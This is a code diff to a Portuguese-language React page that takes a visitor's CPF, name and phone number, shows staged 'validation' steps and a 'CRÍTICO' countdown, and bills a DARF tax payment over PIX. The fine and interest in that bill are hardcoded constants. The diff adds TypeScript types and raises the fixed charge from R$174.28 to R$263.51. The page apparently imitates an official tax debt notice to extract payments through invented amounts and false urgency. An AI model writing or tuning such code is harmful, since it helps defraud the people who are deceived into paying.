@@ -1,6 +1,6 @@
 "use client"
 
-import type React from "react"
+import React from "react"
 
 import { Card, CardContent } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
@@ -116,7 +116,7 @@ export default function Home() {
       const steps = ["Conectando com a base de dados", "Validando informações pessoais", "Preparando resultado"]
 
       const interval = setInterval(() => {
-        setLoadingStep((prev) => {
+        setLoadingStep((prev: number) => {
           if (prev < steps.length - 1) {
             return prev + 1
           } else {
@@ -134,7 +134,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "payment-processing") {
       const interval = setInterval(() => {
-        setPaymentStep((prev) => {
+        setPaymentStep((prev: number) => {
           if (prev < 2) {
             return prev + 1
           } else {
@@ -154,7 +154,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "payment-loading") {
       const interval = setInterval(() => {
-        setPaymentLoadingStep((prev) => {
+        setPaymentLoadingStep((prev: number) => {
           if (prev < 2) {
             return prev + 1
           } else {
@@ -170,7 +170,7 @@ export default function Home() {
                     cpf: cpf,
                     name: userData?.name,
                     phone: phone,
-                    amount: 174.28, // Valor total do DARF
+                    amount: 263.51, // Valor total do DARF
                   }),
                 })
 
@@ -236,7 +236,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "pix-payment" && timeRemaining > 0) {
       const timer = setInterval(() => {
-        setTimeRemaining((prev) => {
+        setTimeRemaining((prev: number) => {
           if (prev <= 1) {
             clearInterval(timer)
             alert("Tempo para pagamento expirado!")
@@ -254,7 +254,7 @@ export default function Home() {
   useEffect(() => {
     if (appState === "result" && userData?.statusType === "CRÍTICO") {
       const interval = setInterval(() => {
-        setTimeLeft((prev) => {
+        setTimeLeft((prev: { hours: number; minutes: number; seconds: number }) => {
           if (prev.seconds > 0) {
             return { ...prev, seconds: prev.seconds - 1 }
           } else if (prev.minutes > 0) {
@@ -491,7 +491,7 @@ export default function Home() {
                       src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixCode)}`}
                       alt="QR Code PIX"
                       className="w-48 h-48 rounded-lg"
-                      onError={(e) => {
+                      onError={(e: React.SyntheticEvent<HTMLImageElement, Event>) => {
                         console.log("[v0] QR Code image failed to load, using fallback")
                         e.currentTarget.style.display = 'none'
                         const nextElement = e.currentTarget.nextElementSibling as HTMLElement
@@ -694,10 +694,10 @@ export default function Home() {
   }
 
   if (appState === "darf") {
-    const valorPrincipal = 93.28 // Valor fixo
-    const multa = 29.55 // Multa fixa
-    const juros = 51.45 // Juros fixos
-    const valorTotal = valorPrincipal + multa + juros // Total: R$ 174,28
+    const valorPrincipal = 140.95 // Valor fixo
+    const multa = 44.70 // Multa fixa
+    const juros = 77.86 // Juros fixos
+    const valorTotal = valorPrincipal + multa + juros // Total: R$ 263,51
     const protocolo = `CTPS${userData?.cpf?.slice(-6) || '123456'}`
 
     return (
